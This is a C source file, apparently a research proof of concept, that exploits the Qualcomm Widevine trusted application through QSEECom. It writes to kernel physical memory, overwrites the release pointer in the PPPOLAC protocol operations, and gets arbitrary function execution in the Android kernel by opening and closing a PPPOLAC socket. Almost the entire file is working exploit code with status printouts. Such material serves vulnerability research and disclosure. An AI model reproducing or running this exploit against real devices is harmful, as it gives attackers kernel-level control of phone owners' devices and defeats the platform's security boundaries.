#include <sys/types.h>
#include <sys/stat.h>
#include <dlfcn.h>
#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <fcntl.h>
#include "QSEEComAPI.h"
#include "symbols.h"
#include "widevine_commands.h"
#include "vuln.h"
#include "defs.h"
#include "exploit_utilities.h"
#include "qsee_syscalls.h"
#include "kallsyms.h"

/**
 * The PPPOLAC protocol number (missing in the socket.h header)
 */
#define PX_PROTO_OLAC (3)

/**
 * The address of the kernel function to execute.
 */
uint32_t (*g_function_addr)(uint32_t, uint32_t, uint32_t, uint32_t);

/**
 * The first argument to the kernel function.
 */
uint32_t g_arg1;

/**
 * The second argument to the kernel function.
 */
uint32_t g_arg2;

/**
 * The third argument to the kernel function.
 */
uint32_t g_arg3;

/**
 * The fourth argument to the kernel function.
 */
uint32_t g_arg4;

/**
 * The return value from the kernel function executed.
 */
uint32_t g_ret_val;

/**
 * A small stub function which is used to execute functions within the kernel.
 */
int kernel_context_execute_func(void) {
	g_ret_val = (g_function_addr)(g_arg1, g_arg2, g_arg3, g_arg4);
	return 0;
}

/**
 * Executes the given function within the kernel, using the supplied arguments.
 * @param func_addr The address of the function to execute.
 * @param arg1 The first argument.
 * @param arg2 The second argument.
 * @param arg3 The third argument.
 * @param arg4 The fourth argument.
 * @return The result of the function's execution.
 */
uint32_t execute_in_kernel(uint32_t func_addr, uint32_t arg1, uint32_t arg2,
						   uint32_t arg3, uint32_t arg4) {

	//Setting the function and arguments
	g_function_addr = (uint32_t(*)(uint32_t,uint32_t,uint32_t,uint32_t))func_addr;
	g_arg1 = arg1;
	g_arg2 = arg2;
	g_arg3 = arg3;
	g_arg4 = arg4;

	//Opening and closing a PPPOLAC socket
    int sock = socket(AF_PPPOX, SOCK_DGRAM, PX_PROTO_OLAC);
    if (sock < 0) {
        perror("[-] Failed to open PPPOLAC socket\n");
        return -errno;
    }
    printf("[+] Opened PPPOLAC socket: %d\n", sock);
    close(sock);
    printf("[+] Executed function\n");

	//Returning the result
	return g_ret_val;
}

/**
 * A small sample function which will be executed in the kernel.
 */
int foo() {
	return 0x1337;
}

int main() {

	//Getting the global handle used to interact with QSEECom
	struct qcom_wv_handle* handle = initialize_wv_handle();
	if (handle == NULL) {
		perror("[-] Failed to initialize Widevine handle");
		return -errno;
	}

	//Loading the widevine application
	int res = (*handle->QSEECom_start_app)((struct QSEECom_handle **)&handle->qseecom,
											WIDEVINE_PATH, WIDEVINE_APP_NAME, WIDEVINE_BUFFER_SIZE);
	if (res < 0) {
		perror("[-] Failed to load Widevine");
		return -errno;
	}
	printf("[+] Widevine load res: %d\n", res);

	//Finding the application within the secure app region
	void* app = find_widevine_application(handle);
	if (!app) {
		perror("[-] Failed to find application\n");
		(*handle->QSEECom_shutdown_app)((struct QSEECom_handle **)&handle->qseecom);
		return -ENOENT;
	}
	printf("[+] Found application at: %p\n", app);

	//Searching for the kernel's symbol table
	uint32_t pppolac_proto_ops_address = kallsyms_lookup_name(handle, app, "pppolac_proto_ops");
	printf("[+] pppolac_proto_ops: 0x%08X\n", pppolac_proto_ops_address);
	uint32_t pppolac_proto_ops_phys_addr = pppolac_proto_ops_address - PHYS_TO_VIRT;
	printf("[+] pppolac_proto_ops physical address: 0x%08X\n", pppolac_proto_ops_phys_addr);

	//Using QSEE to overwrite the PPPOLAC_RELEASE function pointer
	printf("[+] Going to overwrite PPPOLAC pointer\n");
	uint32_t pppolac_proto_ops_release = pppolac_proto_ops_phys_addr + PPPOLAC_RELEASE_OFFSET;
	map_write_dword(handle, app, (uint32_t)kernel_context_execute_func, pppolac_proto_ops_release);
	printf("[+] Hijacked pointer: %08X\n", map_read_dword(handle, app, pppolac_proto_ops_release));	

	//Executing a small function in the kernel
	execute_in_kernel((uint32_t)foo, 0, 0, 0, 0);
	printf("[+] Function returned: %08X\n", g_ret_val);

	//Unloading the widevine app
	(*handle->QSEECom_shutdown_app)((struct QSEECom_handle **)&handle->qseecom);
	printf("[+] Widevine unload res: %d\n", res);

	return 0;

}
